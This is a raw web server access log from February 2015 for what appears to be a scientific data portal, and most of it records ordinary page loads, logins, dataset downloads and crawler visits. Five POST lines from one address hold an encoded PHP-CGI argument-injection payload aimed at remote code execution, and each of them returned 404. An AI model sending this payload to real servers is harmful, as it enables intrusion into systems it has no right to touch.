1.85.234.55 - - [10/Feb/2015:00:35:59 +0800] "GET /sxzn/images/new1.gif HTTP/1.1" 200 1724
1.85.234.55 - - [10/Feb/2015:00:35:58 +0800] "GET /sxzn/images/yonghu.jpg HTTP/1.1" 200 31309
1.85.234.55 - - [10/Feb/2015:00:35:58 +0800] "GET /sxzn/images/banner.jpg HTTP/1.1" 200 38590
1.85.234.55 - - [10/Feb/2015:00:35:58 +0800] "GET /sxzn/images/banner_home.jpg HTTP/1.1" 200 50428
1.85.234.55 - - [10/Feb/2015:00:35:59 +0800] "GET /favicon.ico HTTP/1.1" 404 988
1.85.234.55 - - [10/Feb/2015:00:37:09 +0800] "POST /sxzn/checkLogin.action HTTP/1.1" 302 -
1.85.234.55 - - [10/Feb/2015:00:37:10 +0800] "GET /sxzn/ HTTP/1.1" 200 18398
1.85.234.55 - - [10/Feb/2015:00:37:12 +0800] "GET /favicon.ico HTTP/1.1" 404 988
1.85.234.55 - - [10/Feb/2015:00:37:14 +0800] "GET /sxzn/foreground/viewMetadata.action?id=8 HTTP/1.1" 200 9780
1.85.234.55 - - [10/Feb/2015:00:37:14 +0800] "GET /favicon.ico HTTP/1.1" 404 988
1.85.234.55 - - [10/Feb/2015:00:37:34 +0800] "GET /sxzn/foreground/listDataOfMD.action?id=8 HTTP/1.1" 200 12504
1.85.234.55 - - [10/Feb/2015:00:37:35 +0800] "GET /favicon.ico HTTP/1.1" 404 988
1.85.234.55 - - [10/Feb/2015:00:37:39 +0800] "GET /sxzn/foreground/viewDataset.action?id=33 HTTP/1.1" 200 7168
1.85.234.55 - - [10/Feb/2015:00:37:39 +0800] "GET /favicon.ico HTTP/1.1" 404 988
1.85.234.55 - - [10/Feb/2015:00:37:41 +0800] "GET /sxzn/foreground/downloadDataDocument.action?id=33 HTTP/1.1" 200 34304
1.85.234.55 - - [10/Feb/2015:00:37:49 +0800] "GET /clim/advanced/index.jsp HTTP/1.1" 200 723
1.85.234.55 - - [10/Feb/2015:00:37:49 +0800] "GET /sxzn/inc/topFrame.jsp HTTP/1.1" 200 2963
1.85.234.55 - - [10/Feb/2015:00:37:49 +0800] "GET /clim/advanced/blackPage.jsp HTTP/1.1" 200 -
1.85.234.55 - - [10/Feb/2015:00:37:49 +0800] "GET /clim/climintro.jsp HTTP/1.1" 200 3270
1.85.234.55 - - [10/Feb/2015:00:37:49 +0800] "GET /sxzn/inc/topFrame.jsp HTTP/1.1" 200 2963
1.85.234.55 - - [10/Feb/2015:00:37:49 +0800] "GET /clim/advanced/blackPage.jsp HTTP/1.1" 200 -
1.85.234.55 - - [10/Feb/2015:00:37:49 +0800] "GET /clim/navigation/style.css HTTP/1.1" 404 223
1.85.234.55 - - [10/Feb/2015:00:37:49 +0800] "GET /clim/advanced/left.jsp HTTP/1.1" 200 20497
1.85.234.55 - - [10/Feb/2015:00:37:49 +0800] "GET /favicon.ico HTTP/1.1" 404 988
1.85.234.55 - - [10/Feb/2015:00:37:50 +0800] "GET /clim/advanced/main.jsp?table=clim_um HTTP/1.1" 200 2813
1.85.234.55 - - [10/Feb/2015:00:37:50 +0800] "GET /favicon.ico HTTP/1.1" 404 988
61.149.81.22 - - [10/Feb/2015:00:37:51 +0800] "GET / HTTP/1.1" 302 -
61.149.81.22 - - [10/Feb/2015:00:37:51 +0800] "GET /sxzn/index.action HTTP/1.1" 200 18409
1.85.234.55 - - [10/Feb/2015:00:37:54 +0800] "GET /sxzn/inc/logout.action HTTP/1.1" 302 -
1.85.234.55 - - [10/Feb/2015:00:37:54 +0800] "GET /sxzn/index.action HTTP/1.1" 200 18409
1.85.234.55 - - [10/Feb/2015:00:37:54 +0800] "GET /favicon.ico HTTP/1.1" 404 988
1.85.234.55 - - [10/Feb/2015:00:37:54 +0800] "GET /sxzn/rand.action HTTP/1.1" 200 1237
1.85.234.55 - - [10/Feb/2015:00:37:54 +0800] "GET /sxzn/index.action HTTP/1.1" 200 18409
1.85.234.55 - - [10/Feb/2015:00:37:55 +0800] "GET /sxzn/rand.action HTTP/1.1" 200 1209
1.85.234.55 - - [10/Feb/2015:00:37:55 +0800] "GET /favicon.ico HTTP/1.1" 404 988
61.149.81.22 - - [10/Feb/2015:00:39:33 +0800] "GET / HTTP/1.1" 302 -
61.149.81.22 - - [10/Feb/2015:00:39:33 +0800] "GET /sxzn/index.action HTTP/1.1" 200 18409
61.149.81.22 - - [10/Feb/2015:00:42:47 +0800] "GET / HTTP/1.1" 302 -
61.149.81.22 - - [10/Feb/2015:00:42:48 +0800] "GET /sxzn/index.action HTTP/1.1" 200 18409
61.149.81.22 - - [10/Feb/2015:00:44:25 +0800] "GET / HTTP/1.1" 302 -
61.149.81.22 - - [10/Feb/2015:00:44:25 +0800] "GET /sxzn/index.action HTTP/1.1" 200 18409
101.226.66.173 - - [10/Feb/2015:00:46:45 +0800] "GET /zszx/map/standard/index_2_8.htm HTTP/1.1" 200 47349
61.149.81.22 - - [10/Feb/2015:00:47:48 +0800] "GET / HTTP/1.1" 302 -
61.149.81.22 - - [10/Feb/2015:00:47:48 +0800] "GET /sxzn/index.action HTTP/1.1" 200 18409
180.76.4.241 - - [10/Feb/2015:00:48:56 +0800] "GET / HTTP/1.1" 302 -
61.149.81.22 - - [10/Feb/2015:00:49:37 +0800] "GET / HTTP/1.1" 302 -
61.149.81.22 - - [10/Feb/2015:00:49:37 +0800] "GET /sxzn/index.action HTTP/1.1" 200 18409
87.246.237.227 - - [10/Feb/2015:00:51:25 +0800] "HEAD / HTTP/1.0" 302 -
87.246.237.227 - - [10/Feb/2015:00:51:26 +0800] "POST /cgi-bin/php?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E HTTP/1.1" 404 988
87.246.237.227 - - [10/Feb/2015:00:51:27 +0800] "POST /cgi-bin/php5?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E HTTP/1.1" 404 991
87.246.237.227 - - [10/Feb/2015:00:51:27 +0800] "POST /cgi-bin/php-cgi?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E HTTP/1.1" 404 1000
87.246.237.227 - - [10/Feb/2015:00:51:28 +0800] "POST /cgi-bin/php.cgi?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E HTTP/1.1" 404 1000
87.246.237.227 - - [10/Feb/2015:00:51:32 +0800] "POST /cgi-bin/php4?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E HTTP/1.1" 404 991
111.206.71.85 - - [10/Feb/2015:00:51:53 +0800] "GET / HTTP/1.1" 302 -
220.181.108.181 - - [10/Feb/2015:00:51:57 +0800] "GET / HTTP/1.1" 302 -
61.149.81.22 - - [10/Feb/2015:00:52:58 +0800] "GET / HTTP/1.1" 302 -
61.149.81.22 - - [10/Feb/2015:00:52:58 +0800] "GET /sxzn/index.action HTTP/1.1" 200 18409
61.149.81.22 - - [10/Feb/2015:00:54:31 +0800] "GET / HTTP/1.1" 302 -
61.149.81.22 - - [10/Feb/2015:00:54:31 +0800] "GET /sxzn/index.action HTTP/1.1" 200 18409
61.149.81.22 - - [10/Feb/2015:00:57:48 +0800] "GET / HTTP/1.1" 302 -
61.149.81.22 - - [10/Feb/2015:00:57:48 +0800] "GET /sxzn/index.action HTTP/1.1" 200 18409
61.149.81.22 - - [10/Feb/2015:00:59:39 +0800] "GET / HTTP/1.1" 302 -
61.149.81.22 - - [10/Feb/2015:00:59:39 +0800] "GET /sxzn/index.action HTTP/1.1" 200 18409
61.149.81.22 - - [10/Feb/2015:01:02:59 +0800] "GET / HTTP/1.1" 302 -
61.149.81.22 - - [10/Feb/2015:01:02:59 +0800] "GET /sxzn/index.action HTTP/1.1" 200 18409
61.149.81.22 - - [10/Feb/2015:01:04:44 +0800] "GET / HTTP/1.1" 302 -
61.149.81.22 - - [10/Feb/2015:01:04:55 +0800] "GET /sxzn/index.action HTTP/1.1" 200 18409
61.149.81.22 - - [10/Feb/2015:01:07:47 +0800] "GET / HTTP/1.1" 302 -
61.149.81.22 - - [10/Feb/2015:01:07:47 +0800] "GET /sxzn/index.action HTTP/1.1" 200 18409
61.149.81.22 - - [10/Feb/2015:01:09:39 +0800] "GET / HTTP/1.1" 302 -
61.149.81.22 - - [10/Feb/2015:01:09:39 +0800] "GET /sxzn/index.action HTTP/1.1" 200 18409
61.149.81.22 - - [10/Feb/2015:01:12:49 +0800] "GET / HTTP/1.1" 302 -
61.149.81.22 - - [10/Feb/2015:01:12:49 +0800] "GET /sxzn/index.action HTTP/1.1" 200 18409
61.149.81.22 - - [10/Feb/2015:01:14:31 +0800] "GET / HTTP/1.1" 302 -
61.149.81.22 - - [10/Feb/2015:01:14:31 +0800] "GET /sxzn/index.action HTTP/1.1" 200 18409
123.122.69.105 - - [10/Feb/2015:01:16:03 +0800] "GET /clim/images/climintro2.jpg HTTP/1.1" 200 11519
66.249.73.235 - - [10/Feb/2015:01:16:10 +0800] "GET /robots.txt HTTP/1.1" 200 68
66.249.73.227 - - [10/Feb/2015:01:16:10 +0800] "GET /http_type/tm/html/docments/LT51220382006170IKR00%20Metadata.htm HTTP/1.1" 404 259
66.249.73.243 - - [10/Feb/2015:01:17:04 +0800] "GET /sxzn/browseMetadata.action;jsessionid=EEA1587434D6F57081D9D757B2DF809C HTTP/1.1" 200 26368
66.249.73.227 - - [10/Feb/2015:01:17:45 +0800] "GET /sxzn/css/displaytag.css HTTP/1.1" 200 2309
66.249.73.227 - - [10/Feb/2015:01:17:45 +0800] "GET /sxzn/js/MzTreeView10.js HTTP/1.1" 200 24098
61.149.81.22 - - [10/Feb/2015:01:17:48 +0800] "GET / HTTP/1.1" 302 -
61.149.81.22 - - [10/Feb/2015:01:17:48 +0800] "GET /sxzn/index.action HTTP/1.1" 200 18409
61.149.81.22 - - [10/Feb/2015:01:19:29 +0800] "GET / HTTP/1.1" 302 -
61.149.81.22 - - [10/Feb/2015:01:19:29 +0800] "GET /sxzn/index.action HTTP/1.1" 200 18409
61.149.81.22 - - [10/Feb/2015:01:23:02 +0800] "GET / HTTP/1.1" 302 -
61.149.81.22 - - [10/Feb/2015:01:23:02 +0800] "GET /sxzn/index.action HTTP/1.1" 200 18409
61.149.81.22 - - [10/Feb/2015:01:24:31 +0800] "GET / HTTP/1.1" 302 -
61.149.81.22 - - [10/Feb/2015:01:24:34 +0800] "GET /sxzn/index.action HTTP/1.1" 200 18409
61.149.81.22 - - [10/Feb/2015:01:28:01 +0800] "GET / HTTP/1.1" 302 -
61.149.81.22 - - [10/Feb/2015:01:28:01 +0800] "GET /sxzn/index.action HTTP/1.1" 200 18409
61.149.81.22 - - [10/Feb/2015:01:29:50 +0800] "GET / HTTP/1.1" 302 -
61.149.81.22 - - [10/Feb/2015:01:29:51 +0800] "GET /sxzn/index.action HTTP/1.1" 200 18409
61.149.81.22 - - [10/Feb/2015:01:32:58 +0800] "GET / HTTP/1.1" 302 -
61.149.81.22 - - [10/Feb/2015:01:32:58 +0800] "GET /sxzn/index.action HTTP/1.1" 200 18409
61.149.81.22 - - [10/Feb/2015:01:34:30 +0800] "GET / HTTP/1.1" 302 -
61.149.81.22 - - [10/Feb/2015:01:34:30 +0800] "GET /sxzn/index.action HTTP/1.1" 200 18409
61.149.81.22 - - [10/Feb/2015:01:37:57 +0800] "GET / HTTP/1.1" 302 -
61.149.81.22 - - [10/Feb/2015:01:37:57 +0800] "GET /sxzn/index.action HTTP/1.1" 200 18409
61.149.81.22 - - [10/Feb/2015:01:39:50 +0800] "GET / HTTP/1.1" 302 -
61.149.81.22 - - [10/Feb/2015:01:39:50 +0800] "GET /sxzn/index.action HTTP/1.1" 200 18409
61.149.81.22 - - [10/Feb/2015:01:42:49 +0800] "GET / HTTP/1.1" 302 -
61.149.81.22 - - [10/Feb/2015:01:42:49 +0800] "GET /sxzn/index.action HTTP/1.1" 200 18409
61.149.81.22 - - [10/Feb/2015:01:44:47 +0800] "GET / HTTP/1.1" 302 -
61.149.81.22 - - [10/Feb/2015:01:44:47 +0800] "GET /sxzn/index.action HTTP/1.1" 200 18409
210.121.164.67 - - [10/Feb/2015:01:47:14 +0800] "POST / HTTP/1.1" 302 -
210.121.164.67 - - [10/Feb/2015:01:47:14 +0800] "GET /sxzn/index.action HTTP/1.1" 200 18522
61.149.81.22 - - [10/Feb/2015:01:47:47 +0800] "GET / HTTP/1.1" 302 -
61.149.81.22 - - [10/Feb/2015:01:47:47 +0800] "GET /sxzn/index.action HTTP/1.1" 200 18409
61.149.81.22 - - [10/Feb/2015:01:49:39 +0800] "GET / HTTP/1.1" 302 -
61.149.81.22 - - [10/Feb/2015:01:49:39 +0800] "GET /sxzn/index.action HTTP/1.1" 200 18409
61.149.81.22 - - [10/Feb/2015:01:52:56 +0800] "GET / HTTP/1.1" 302 -
